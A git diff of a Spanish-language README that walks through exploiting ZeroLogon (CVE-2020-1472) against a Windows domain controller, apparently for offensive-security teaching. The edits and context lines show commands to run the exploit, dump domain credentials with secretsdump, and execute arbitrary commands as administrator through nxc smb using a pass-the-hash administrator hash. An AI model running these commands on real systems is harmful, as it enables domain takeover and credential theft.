@@ -68,7 +68,7 @@ pip install -r requirements.txt
 python3 cve-2020-1472-exploit.py
 ```
 
-O usar argumentos manuales:
+Usar argumentos:
 
 ```bash
 python3 cve-2020-1472-exploit.py -t [IP_DEL_DC] -n [NOMBRE_DEL_DC]
@@ -107,7 +107,7 @@ nxc smb [IP_DEL_DC] -u '[USUARIO_ADMINISTRADOR]' -H '[HASH_DE_ADMINISTRADOR]' --
 python3 reinstall_original_pw.py
 ```
 
-O con argumentos:
+Con argumentos:
 
 ```bash
 python3 reinstall_original_pw.py [NOMBRE_DEL_DC]$ [IP_DEL_DC] [HEX_DE_CONTRASEÑA_DEL_DC]
@@ -126,8 +126,10 @@ impacket-secretsdump '[[NOMBRE_DEL_DOMINIO]]/[NOMBRE_DEL_DC]$@[IP_DEL_DC]'
 ### 9. Ejecutar comando remoto como administrador
 
 ```bash
-nxc smb [IP_DEL_DC] -u 'administrator' -H '[HASH_DE_ADMINISTRADOR]' -x whoami
+nxc smb [IP_DEL_DC] -u 'administrator' -H '[HASH_DE_ADMINISTRADOR]' -x [COMANDO]
 ```
+si usamos `-x` ejecutaremos con CMD y si usamos `-X` ejecutaremos con Powershell.
+
 ### 🛠 Comandos útiles post-explotación con `nxc smb`
 
 | Comando        | Descripción                                       |
@@ -182,4 +184,4 @@ El exploit ZeroLogon cambia la contraseña de la cuenta de máquina del controla
 
 ## 👤 Autor
 
-Explicación elaborada por [Sebastian Peinador](https://www.linkedin.com/in/sebastian-j-peinador/) para propósitos didácticos y de investigación en ciberseguridad ofensiva.
+Explicación elaborada por [Sebastian Peinador](https://www.linkedin.com/in/sebastian-j-peinador/) para propósitos didácticos y de investigación en ciberseguridad ofensiva. en colaboracion con: [Daniel Delfino](https://www.linkedin.com/in/dsldelfino/),  [Diego Peinador](https://www.linkedin.com/in/peinadordiego/) y [Francisco Fariña](https://www.linkedin.com/in/francisco-farina/)
